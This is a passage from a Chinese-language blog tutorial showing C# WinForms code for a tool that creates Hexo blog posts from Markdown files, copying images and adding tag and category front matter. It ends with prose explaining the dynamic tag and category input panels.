class="line">                AutoSize = <span class="literal">false</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算文本的宽度</span></span><br><span class="line">            SizeF textSize = TextRenderer.MeasureText(filePath, filePathValueLabel.Font);</span><br><span class="line">            filePathValueLabel.Width = (<span class="built_in">int</span>)textSize.Width + <span class="number">20</span>;  <span class="comment">// 20 是为了留一些额外的空间，可以根据需要调整</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标题标签</span></span><br><span class="line">            Label titleLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Title&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标题输入框</span></span><br><span class="line">            TextBox titleTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Multiline = <span class="literal">true</span>,</span><br><span class="line">                Width = <span class="number">300</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标签输入框</span></span><br><span class="line">            Label tagsLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Tags&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">            tagsPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                Dock = DockStyle.Top,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">                WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 创建加号按钮</span></span><br><span class="line">            addTagButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            addTagButton.Click += AddTagButton_Click;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建减号按钮</span></span><br><span class="line">            removeTagButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            removeTagButton.Click += RemoveTagButton_Click;</span><br><span class="line">            <span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">            AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建分类输入框</span></span><br><span class="line">            Label categoryLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Category&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">            categoriesPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                Dock = DockStyle.Top,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">                WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 创建加号按钮</span></span><br><span class="line">            addCategoryButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            addCategoryButton.Click += AddCategoryButton_Click;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建减号按钮</span></span><br><span class="line">            removeCategoryButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            removeCategoryButton.Click += RemoveCategoryButton_Click;</span><br><span class="line">            <span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">            AddInputBox(categoriesPanel, categoriesTextBoxes, addCategoryButton, removeCategoryButton);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建确定按钮</span></span><br><span class="line">            Button confirmButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Process&quot;</span>,</span><br><span class="line">                Width = <span class="number">100</span>,</span><br><span class="line">                Height = <span class="number">40</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 点击按钮时执行 ProcessMarkdownFile</span></span><br><span class="line">            confirmButton.Click += (sender, e) =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                confirmButton.Visible = <span class="literal">false</span>;  <span class="comment">// 隐藏确定按钮，防止用户多次点击</span></span><br><span class="line">                <span class="built_in">string</span> title = titleTextBox.Text;</span><br><span class="line">                List&lt;<span class="built_in">string</span>&gt; tags = GetTags();</span><br><span class="line">                List&lt;<span class="built_in">string</span>&gt; category = GetCategories();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 非空检测</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(title))</span><br><span class="line">                &#123;</span><br><span class="line">                    MessageBox.Show(<span class="string">&quot;Title cannot be empty.&quot;</span>, <span class="string">&quot;Input Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                    <span class="keyword">return</span>;  <span class="comment">// 直接退出，不继续执行后续代码</span></span><br><span class="line">                &#125;</span><br><span class="line">                ProcessMarkdownFile(title, tags, category, filePath);</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 Process 信息框</span></span><br><span class="line">            processInfoBox = <span class="keyword">new</span> RichTextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Multiline = <span class="literal">true</span>,</span><br><span class="line">                Width = <span class="number">600</span>,</span><br><span class="line">                Height = <span class="number">200</span>,</span><br><span class="line">                ReadOnly = <span class="literal">true</span>,  <span class="comment">// 设置为只读</span></span><br><span class="line">                ScrollBars = RichTextBoxScrollBars.Vertical,  <span class="comment">// 启用滚动条</span></span><br><span class="line">                WordWrap = <span class="literal">true</span>,   <span class="comment">// 自动换行</span></span><br><span class="line">                Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将控件添加到 TableLayoutPanel</span></span><br><span class="line">            tableLayoutPanel.Controls.Add(filePathLabel, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(filePathValueLabel, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(titleLabel, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(titleTextBox, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(tagsLabel, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(tagsPanel, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(categoryLabel, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(categoriesPanel, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(confirmButton, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(processInfoBox, <span class="number">1</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button addButton, Button removeButton</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建新的 TextBox 控件</span></span><br><span class="line">            TextBox newInputTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Width = <span class="number">100</span>,  <span class="comment">// 设置适当的宽度</span></span><br><span class="line">                Margin = <span class="keyword">new</span> Padding(<span class="number">5</span>)  <span class="comment">// 设置间距</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将新的 TextBox 添加到列表和面板</span></span><br><span class="line">            textBoxesList.Add(newInputTextBox);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先移除+-号按钮，之后再添加，确保在最后一个位置</span></span><br><span class="line">            <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">                inputPanel.Controls.Remove(removeButton);</span><br><span class="line">            inputPanel.Controls.Remove(addButton);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加新的输入框和按钮</span></span><br><span class="line">            inputPanel.Controls.Add(newInputTextBox);</span><br><span class="line">            inputPanel.Controls.Add(addButton);  <span class="comment">// 将加号按钮添加到 inputPanel 中</span></span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">                inputPanel.Controls.Add(removeButton);  <span class="comment">// 将减号按钮添加到 inputPanel 中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button removeButton</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取列表中最后一个添加的 TextBox 和相应的按钮</span></span><br><span class="line">                TextBox lastInputTextBox = textBoxesList.Last();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 从 inputPanel 和 textBoxesList 中移除最后一个 TextBox 和按钮</span></span><br><span class="line">                <span class="keyword">if</span> (lastInputTextBox != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    inputPanel.Controls.Remove(lastInputTextBox);</span><br><span class="line">                    textBoxesList.Remove(lastInputTextBox);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果只有一个标签输入框，则隐藏减号按钮</span></span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">                    inputPanel.Controls.Remove(removeButton);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            RemoveInputBox(tagsPanel, tagsTextBoxes, removeTagButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddCategoryButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddInputBox(categoriesPanel, categoriesTextBoxes, addCategoryButton, removeCategoryButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveCategoryButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            RemoveInputBox(categoriesPanel, categoriesTextBoxes, removeCategoryButton);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取用户输入的所有标签</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetTags</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; tags = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> tagsTextBoxes)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">                &#123;</span><br><span class="line">                    tags.Add(textBox.Text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tags;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取用户输入的所有类型</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetCategories</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; categories = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> categoriesTextBoxes)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">                &#123;</span><br><span class="line">                    categories.Add(textBox.Text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> categories;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示提示信息</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">AppendMessage</span>(<span class="params"><span class="built_in">string</span> message, Color color</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置不同颜色（可选）</span></span><br><span class="line">            processInfoBox.SelectionColor = color;  <span class="comment">// 设置文本颜色</span></span><br><span class="line">            processInfoBox.AppendText(message + Environment.NewLine);</span><br><span class="line">            processInfoBox.ScrollToCaret();  <span class="comment">// 确保显示滚动到文本底部</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理Markdown文件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> title, List&lt;<span class="built_in">string</span>&gt; tags, List&lt;<span class="built_in">string</span>&gt; category, <span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Settings settings = <span class="keyword">new</span> Settings();</span><br><span class="line">            settings.LoadSettings();</span><br><span class="line">            <span class="built_in">string</span> hexoDirectory = settings.HexoDirectory;</span><br><span class="line">            <span class="built_in">string</span> rootDirectory = hexoDirectory.Substring(<span class="number">0</span>, hexoDirectory.LastIndexOf(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">            <span class="built_in">string</span> postDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> hexoNewCmd = <span class="string">$&quot;hexo new \&quot;<span class="subst">&#123;title&#125;</span>\&quot;&quot;</span>;    <span class="comment">// 创建新文章命令</span></span><br><span class="line">            AppendMessage(<span class="string">$&quot;[*] executing command: <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>, Color.Black);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 使用 Process 执行命令</span></span><br><span class="line">                ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">                &#123;</span><br><span class="line">                    FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">                    Arguments = <span class="string">$&quot;/c <span class="subst">&#123;rootDirectory&#125;</span> &amp;&amp; cd <span class="subst">&#123;hexoDirectory&#125;</span> &amp;&amp; <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>,</span><br><span class="line">                    CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">                    UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">                    RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">                    RedirectStandardError = <span class="literal">true</span>,</span><br><span class="line">                  </span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (Process process = Process.Start(processStartInfo))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span> output = <span class="keyword">await</span> process.StandardOutput.ReadToEndAsync();</span><br><span class="line">                    <span class="built_in">string</span> error = <span class="keyword">await</span> process.StandardError.ReadToEndAsync();</span><br><span class="line">                    </span><br><span class="line">                    process.WaitForExit();</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (process.ExitCode != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        MessageBox.Show(<span class="string">$&quot;Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[-] Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (File.Exists(Path.Combine(postDirectory, title + <span class="string">&quot;.md&quot;</span>)))        <span class="comment">// 检查新文章是否创建成功</span></span><br><span class="line">                        AppendMessage(<span class="string">&quot;[+] successfully created new post!&quot;</span>,Color.Green);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                MessageBox.Show(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取生成的 Markdown 文件路径</span></span><br><span class="line">            <span class="built_in">string</span> targetMarkdownFilePath = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>, <span class="string">$&quot;<span class="subst">&#123;title&#125;</span>.md&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> targetMarkdownPictureDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>, <span class="string">$&quot;<span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> fileContent = <span class="keyword">await</span> Task.Run(() =&gt; File.ReadAllText(filePath, Encoding.UTF8));     <span class="comment">// 异步读取 Markdown 文件内容</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建 YAML 前言部分</span></span><br><span class="line">            StringBuilder frontMatter = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">            frontMatter.AppendLine(<span class="string">$&quot;title: <span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">            frontMatter.AppendLine(<span class="string">$&quot;date: <span class="subst">&#123;DateTime.Now:yyyy-MM-dd HH:mm:ss&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加 tags</span></span><br><span class="line">            <span class="keyword">if</span> (tags != <span class="literal">null</span> &amp;&amp; tags.Count &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                frontMatter.AppendLine(<span class="string">&quot;tags:&quot;</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">string</span> tag <span class="keyword">in</span> tags)</span><br><span class="line">                &#123;</span><br><span class="line">                    frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;tag&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加 categories</span></span><br><span class="line">            <span class="keyword">if</span> (category != <span class="literal">null</span> &amp;&amp; category.Count &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                frontMatter.AppendLine(<span class="string">&quot;categories:&quot;</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">string</span> cat <span class="keyword">in</span> category)</span><br><span class="line">                &#123;</span><br><span class="line">                    frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;cat&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 正则表达式：查找所有的图片引用</span></span><br><span class="line">            <span class="built_in">string</span> imagePattern = <span class="string">@&quot;!\[([^\]]+)\]\(([^)]+)\)&quot;</span>;</span><br><span class="line">            MatchCollection matches = Regex.Matches(fileContent, imagePattern);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (Match match <span class="keyword">in</span> matches)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> altText = match.Groups[<span class="number">1</span>].Value;  <span class="comment">// 图片描述</span></span><br><span class="line">                <span class="built_in">string</span> imgPath = match.Groups[<span class="number">2</span>].Value;  <span class="comment">// 图片路径</span></span><br><span class="line"></span><br><span class="line">                imgPath = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(filePath), imgPath));      <span class="comment">// 处理相对路径</span></span><br><span class="line">                imgPath = imgPath.Replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 确保路径使用正斜杠</span></span><br><span class="line">                <span class="comment">// 提取图片文件名</span></span><br><span class="line">                <span class="built_in">string</span> imgFilename = Path.GetFileName(imgPath);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 检查图片文件是否存在</span></span><br><span class="line">                <span class="keyword">if</span> (File.Exists(imgPath))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 复制图片到目标目录</span></span><br><span class="line">                        <span class="built_in">string</span> targetPath = targetMarkdownPictureDirectory+<span class="string">&quot;/&quot;</span> + imgFilename;</span><br><span class="line">                        <span class="keyword">await</span> Task.Run(() =&gt; File.Copy(imgPath, targetPath, <span class="literal">true</span>));  <span class="comment">// 异步复制图片</span></span><br><span class="line">                        </span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[*] Copying image: <span class="subst">&#123;imgPath&#125;</span> to <span class="subst">&#123;targetPath&#125;</span>&quot;</span>, Color.Blue);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 更新 Markdown 内容</span></span><br><span class="line">                        <span class="built_in">string</span> newReference = <span class="string">$&quot;&#123;&#123;% asset_img <span class="subst">&#123;imgFilename&#125;</span> %&#125;&#125;&quot;</span>;</span><br><span class="line">                        fileContent = fileContent.Replace(match.Value, newReference);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">                    &#123;</span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[-] Error moving image <span class="subst">&#123;imgPath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    AppendMessage(<span class="string">$&quot;[-] Image not found: <span class="subst">&#123;imgPath&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                    <span class="comment">// 可以选择是否退出或继续处理</span></span><br><span class="line">                    <span class="comment">// exit();  // 如果需要退出的话</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将内容合并</span></span><br><span class="line">            <span class="built_in">string</span> finalContent = frontMatter.ToString() + Environment.NewLine + fileContent;</span><br><span class="line">            <span class="comment">// 写入文件</span></span><br><span class="line">            <span class="comment">//File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8);</span></span><br><span class="line">            <span class="keyword">await</span> Task.Run(() =&gt; File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8));</span><br><span class="line">            AppendMessage(<span class="string">$&quot;[+] successfully processed <span class="subst">&#123;filePath&#125;</span> to <span class="subst">&#123;targetMarkdownFilePath&#125;</span>&quot;</span>, Color.Green);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="获取tags、categories等相关信息UI"><a href="#获取tags、categories等相关信息UI" class="headerlink" title="获取tags、categories等相关信息UI"></a>获取tags、categories等相关信息UI</h5><p>主要也是用<strong>TableLayoutPanel</strong>进行页面设计，这里我们先改一下Form1.cs，让点击File的菜单栏后不是只有弹文件选择，而是先利用之前实现的<strong>AddTab</strong>来创建一个<strong>TabPage</strong>，然后再调用<strong>FileProcessor.cs</strong>中的<strong>CreateProcessMarkdownPanel</strong>方法来返回文件处理的面板。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FileToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddTab(<span class="string">&quot;File&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (tabName)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;File&quot;</span>:</span><br><span class="line">        <span class="comment">// 创建文件选择对话框</span></span><br><span class="line">        <span class="keyword">using</span> (OpenFileDialog fileDialog = <span class="keyword">new</span> OpenFileDialog())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置对话框的描述</span></span><br><span class="line">            fileDialog.Title = <span class="string">&quot;请选择文件&quot;</span>;</span><br><span class="line">            fileDialog.Filter = <span class="string">&quot;Markdown 文件 (*.md)|*.md|所有文件 (*.*)|*.*&quot;</span>; <span class="comment">// 你可以根据需要设置过滤器</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 显示文件选择对话框并检查用户是否选择了文件</span></span><br><span class="line">            <span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">                selectedFilePath = fileDialog.FileName;</span><br><span class="line">              </span><br><span class="line">                <span class="comment">// 处理选中的文件</span></span><br><span class="line">                FileProcessor processor = <span class="keyword">new</span> FileProcessor();</span><br><span class="line">                newTab.Controls.Add(processor.CreateProcessMarkdownPanel(selectedFilePath));</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>每一行的设计也有区别，首先文章标题的输入可以直接使用TextBox文本框获取。而tags和categories由于可以存在多个，可行的方案之一是也用TextBox读取，然后指定某个分隔符来分开多个不同的tag和category。但这样显然比较麻烦，所以我们可以使用<strong>FlowLayoutPanel</strong>来进行动态的布局设计，目标是可以创建一系列不同的TextBox输入框，点击+按钮新建一个tag输入框，点击-按钮删除一个tag输入框。该布局模板可以动态的根据屏幕大小进行适应，比如可以自动换行，相当方便。+-按钮都要绑定一个点击事件。</p>
